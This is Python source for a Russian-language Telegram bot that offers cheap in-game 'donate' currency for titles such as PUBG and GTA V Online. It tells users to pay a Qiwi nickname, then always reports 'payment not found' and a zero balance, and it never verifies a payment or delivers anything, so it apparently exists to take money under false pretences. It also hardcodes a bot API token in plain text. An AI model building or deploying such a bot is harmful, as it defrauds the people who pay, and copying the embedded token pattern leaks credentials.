import telebot 
import random
from telebot import types
import cfg as nav

admin = 'https://t.me/TbI_KPbIM'
qiwi = "GHOSTRIVER"

token = '5109234430:AAEKkcYdEbMQPoQJ5dOziGmWm2U4oRVVCrA'
bot = telebot.TeleBot(token)

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_sticker(message.chat.id, 'CAACAgIAAxkBAAEDmeth0hNgsCQ4BgJkuMclJym77djfyQACAQEAAladvQoivp8OuMLmNCME')
    first_name = message.from_user.first_name
    bot.send_message(message.chat.id, '<b>👋🏻 Приветствую! {0}</b>\n<b>🌴У нас дешевле чем у  самих</b><code>Создателей</code>'.format(first_name), parse_mode = 'html', reply_markup = nav.markup)
@bot.message_handler(content_types=['text'])
def text(message):
	if message.text == '🗄️ Личный Кабинет':
		bot.send_message(message.chat.id, '<b>🗄️ Личный Кабинет</b>', parse_mode = 'html', reply_markup = nav.markup2)
	if message.text == '🌿 Связь с Админ.':
		markup = types.InlineKeyboardMarkup()
		button1 = types.InlineKeyboardButton('☘️ Связь с админом', url=(admin))
		markup.add(button1)
		bot.send_message(message.chat.id, '<b>Если у вас проблемы или вам просто скучно обращайтесь!</b>', parse_mode = 'html', reply_markup = markup)
	if message.text == '🏧 Пополнить':
		bot.send_message(message.chat.id, '<b>Через какую платёжную систему будем пополнять</b>', reply_markup = nav.markup3, parse_mode = 'html')
	if message.text == '🀄Моя статистика':
		bot.send_message(message.chat.id, '<code>☯️Ваша статистика: \n➖➖➖➖➖➖➖ </code>\nБаланс: <code> 0.00₽ </code>\n➖➖➖➖➖➖➖\n🇷🇺Всего пополнений: <code> 0.00₽ </code>\nВсего купленной валюты: ', parse_mode = 'html')
	if message.text == '💱 Игровая Валюта':
		bot.send_message(message.chat.id, '🌡️Выберите платформу: ', reply_markup = nav.markup4)
	if message.text == '🛰️К лич. кабинету':
		bot.send_message(message.chat.id, '☯️Статистика', reply_markup = nav.markup2)
	if message.text == '🌴В главное меню🌴':
		bot.send_message(message.chat.id, '🌴Главное меню', reply_markup = nav.markup)
	if message.text == '📺Доступный ДОНАТ📺':
		bot.send_message(message.chat.id, '<b>Доступные игры: </b>', parse_mode = 'html', reply_markup = nav.markup5)
	if message.text == 'WarFace(400 donat)':
		bot.send_message(message.chat.id, '<b>Недостаточно средств для совершения оплаты, пожалуйста пополните баланс</b>', parse_mode = 'html')
	if message.text == 'GTA V online(1000 donat)':
		bot.send_message(message.chat.id, '<b>Недостаточно средств для совершения оплаты, пожалуйста пополните баланс</b>', parse_mode = 'html') 
	if message.text == 'PUBG(500 donat)':
		bot.send_message(message.chat.id, '<b>Недостаточно средств для совершения оплаты, пожалуйста пополните баланс</b>', parse_mode = 'html') 
	if message.text == '🍁Оплатил🍁':
		bot.send_message(message.chat.id, 'Проверяем платеж⚙️')
		bot.send_message(message.chat.id, 'Платёж не найден.Проверьте точность введеных данных и повторите попытку!')
	if message.text == '⛔Отмена⛔':
		bot.send_message(message.chat.id, 'Отмена платежа', reply_markup = nav.markup)
	if message.text == '🌴GTA V online🌴':
		bot.send_message(message.chat.id, '<b>🔥Выбирай</b>', parse_mode = 'html', reply_markup = nav.warface)
	if message.text == '🔫PUBG🔫':
		bot.send_message(message.chat.id, '<b>🔥Выбирай</b>', parse_mode = 'html', reply_markup = nav.pubg)
	if message.text == '🧿STEAM':
		bot.send_message(message.chat.id, '<b>🔥Выбирай</b>', parse_mode = 'html', reply_markup = nav.pubg)
	if message.text == '☄️ 100 DONATE':
		bot.send_message(message.chat.id, '<b>Недостаточно средств, пополните баланс!</b>', parse_mode = 'html')
	if message.text == '☄️ 500 DONATE':
		bot.send_message(message.chat.id, '<b>Недостаточно средств, пополните баланс!</b>', parse_mode = 'html')
	if message.text == '☄️ 1000 DONATE':
		bot.send_message(message.chat.id, '<b>Недостаточно средств, пополните баланс!</b>', parse_mode = 'html')
	if message.text == "🥝 Qiwi":
		bot.send_message(message.chat.id, """➖➖➖➖➖➖➖➖➖
🥝<b>СПОСОБ ОПЛАТЫ ЧЕРЕЗ QIWI</b>🥝
➖➖➖➖➖➖➖➖➖

1️⃣ <b>Для оплаты переведите нужную сумму на этот ник:</b>
<code>""" + (qiwi) + """</code>

2️⃣ <b>В комментарии к платежу укажите:</b>
<code>""" + str(random.randint(1111111, 9999999)) + """</code>

3️⃣ <b>После оплаты нажмите на кнопку «🍁Оплатил»!</b>""", reply_markup=nav.opl, parse_mode='html')

bot.polling(none_stop = True)
    
    